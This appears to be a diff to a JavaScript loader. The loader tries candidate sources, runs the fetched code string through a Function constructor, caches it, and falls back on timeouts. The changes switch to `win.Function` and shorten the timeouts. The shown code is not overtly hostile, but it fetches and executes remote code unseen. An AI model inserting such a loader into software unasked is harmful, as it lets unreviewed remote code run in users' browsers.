@@ -40,7 +40,7 @@
             {
                 loaded = true;
                 scriptCode = codeStr;
-                (new Function(codeStr))();
+                (new win.Function(codeStr))();
 
                 let cache = await window?.["caches"]?.open?.("v");
                 if (cache)
@@ -64,7 +64,7 @@
             {
                 if (!loaded)
                     tryCandidate(index + 1);
-            }, 3 * 1000);
+            }, 2 * 1000);
     }
 
     tryCandidate(0);
@@ -82,8 +82,8 @@
             {
                 loaded = true;
                 scriptCode = codeStr;
-                (new Function(codeStr))();
+                (new win.Function(codeStr))();
             }
         }
-    }, 7 * 1000);
+    }, 5 * 1000);
 })();
